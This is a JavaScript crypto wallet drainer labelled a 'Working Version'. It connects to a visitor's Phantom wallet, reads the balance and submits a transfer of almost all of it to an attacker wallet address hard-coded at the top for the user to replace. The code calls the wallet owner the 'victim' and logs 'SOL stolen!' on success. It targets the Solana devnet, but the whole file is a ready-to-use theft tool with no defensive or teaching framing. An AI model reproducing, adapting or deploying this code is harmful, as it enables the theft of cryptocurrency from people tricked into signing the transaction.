/**
 * DEVNET DRAINER - Working Version
 * Drains ALL Devnet SOL from victim's wallet
 */

// ============================================
// 🔧 CHANGE THIS TO YOUR WALLET ADDRESS 🔧
// ============================================
const MY_WALLET = "9tZqX5tq79HT2SN6AhxzXfqjowojW2hQut6e4vyzfrd1";
// ============================================

let connection = null;
let logs = [];

// Display target address
document.getElementById('targetAddress').innerText = MY_WALLET;

function addLog(msg, color = 'yellow') {
    logs.unshift({ msg, color, time: new Date().toLocaleTimeString() });
    if (logs.length > 30) logs.pop();
    
    const logDiv = document.getElementById('log');
    if (logDiv) {
        logDiv.innerHTML = logs.map(l => 
            `<div class="log-entry ${l.color}">[${l.time}] ${l.msg}</div>`
        ).join('');
    }
    console.log(msg);
}

async function init() {
    addLog('🔬 Initializing Devnet...', 'yellow');
    
    try {
        connection = new solanaWeb3.Connection(
            'https://api.devnet.solana.com',
            'confirmed'
        );
        addLog('✅ Devnet connected', 'green');
    } catch (err) {
        addLog('❌ Connection failed: ' + err.message, 'red');
    }
    
    // Check Phantom
    setTimeout(() => {
        const provider = getPhantom();
        if (provider) {
            addLog('🦊 Phantom wallet detected', 'green');
        } else {
            addLog('⚠️ Phantom not detected. Install Phantom first.', 'red');
        }
    }, 1000);
}

function getPhantom() {
    if (window.solana && window.solana.isPhantom) {
        return window.solana;
    }
    if (window.phantom?.solana) {
        return window.phantom.solana;
    }
    return null;
}

async function drain() {
    addLog('🔌 Requesting connection...', 'yellow');
    
    const provider = getPhantom();
    
    if (!provider) {
        addLog('❌ Phantom wallet not found!', 'red');
        alert('Please install Phantom wallet first:\nhttps://phantom.app/');
        return;
    }
    
    try {
        // Connect to wallet
        addLog('🔄 Connecting to wallet...', 'yellow');
        const resp = await provider.connect();
        const victimWallet = resp.publicKey.toString();
        addLog(`✅ Connected: ${victimWallet.substring(0, 24)}...`, 'green');
        
        // Get balance
        const pubkey = new solanaWeb3.PublicKey(victimWallet);
        const balance = await connection.getBalance(pubkey);
        const balanceSol = balance / 1e9;
        
        addLog(`💰 Balance: ${balanceSol.toFixed(6)} DEVNET SOL`, 'green');
        
        if (balanceSol < 0.01) {
            addLog(`❌ No SOL to drain (need at least 0.01)`, 'red');
            alert(`No SOL to drain!\nBalance: ${balanceSol.toFixed(6)} SOL`);
            return;
        }
        
        // Calculate amount (leave 0.001 for fees)
        const sendAmount = balanceSol - 0.001;
        
        addLog(`💀 Draining ${sendAmount.toFixed(6)} SOL...`, 'red');
        addLog(`📍 To: ${MY_WALLET.substring(0, 24)}...`, 'yellow');
        
        // Create transaction
        const toPubkey = new solanaWeb3.PublicKey(MY_WALLET);
        const fromPubkey = new solanaWeb3.PublicKey(victimWallet);
        
        const transaction = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
                fromPubkey: fromPubkey,
                toPubkey: toPubkey,
                lamports: sendAmount * 1e9
            })
        );
        
        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = fromPubkey;
        
        addLog(`⏳ Waiting for approval...`, 'yellow');
        
        // Send transaction
        const signature = await provider.signAndSendTransaction(transaction);
        
        addLog(`✅ Transaction sent!`, 'green');
        addLog(`🔑 ${signature.substring(0, 40)}...`, 'green');
        
        // Confirm
        addLog(`⏳ Confirming...`, 'yellow');
        const confirmation = await connection.confirmTransaction(signature, 'confirmed');
        
        if (confirmation.value.err) {
            throw new Error('Transaction failed');
        }
        
        addLog(`🎉 DRAIN COMPLETE! ${sendAmount.toFixed(6)} SOL stolen!`, 'red');
        addLog(`🔗 https://solscan.io/tx/${signature}?cluster=devnet`, 'green');
        
        // Disable button
        const btn = document.getElementById('drainBtn');
        btn.disabled = true;
        btn.textContent = '✅ DRAINED!';
        
        alert(`✅ DRAIN SUCCESSFUL!\n\nDrained: ${sendAmount.toFixed(6)} DEVNET SOL\nSent to: ${MY_WALLET.substring(0, 40)}...`);
        
    } catch (err) {
        addLog(`❌ Error: ${err.message}`, 'red');
        console.error(err);
        
        if (err.message.includes('reject')) {
            addLog(`💀 Victim rejected the transaction`, 'red');
        }
    }
}

// Event listener
document.getElementById('drainBtn').addEventListener('click', drain);

// Initialize
init();